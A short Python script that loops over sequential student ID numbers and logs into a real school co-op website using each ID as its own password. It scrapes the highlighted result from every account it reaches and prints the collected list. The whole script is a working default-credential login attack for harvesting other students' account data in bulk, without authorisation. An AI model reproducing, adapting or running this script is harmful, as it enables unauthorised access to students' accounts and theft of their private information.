#!/usr/bin/env python
# coding: utf-8

from urllib.request import urlopen
from urllib.request import Request
from bs4 import BeautifulSoup as BS

resultsList = []
useridList = []

def setuserid():
	global startuserid
	global crawlerNum
	startuserid = int(input('請輸入爬蟲起始學號：'))
	crawlerNum = int(input('請輸入欲爬出的結果數量：'))

def generateUserIDList():
	for i in range(crawlerNum):
		useridList.append(startuserid+i)

def get():
	# Send Request
	for x in useridList:
		print ('正在查詢：'+str(x))
		try:
			rawRequest = [
			        'userid='+str(x),
					'password='+str(x)
						]

			req = Request('http://coop.jwsh.tp.edu.tw/',data='&'.join(rawRequest).encode())
			x = urlopen(req)
			req = x.read()
			reqBS = BS(req,"html.parser")
		
			#Data of Request
			results = reqBS.find('font', {'color':'#bb0000'}).string
			resultsList.append(results)
			
		except:
			print ('查詢失敗：'+str())

def printResult():
	print ('=========最終結果=========')
	try:
		for z in range(crawlerNum):
			print (str(useridList[z])+'：',end='')
			print (resultsList[z])
	except:
		pass
	print ('==========================')

def main():
	setuserid()
	generateUserIDList()
	get()
	printResult()
	main()

main()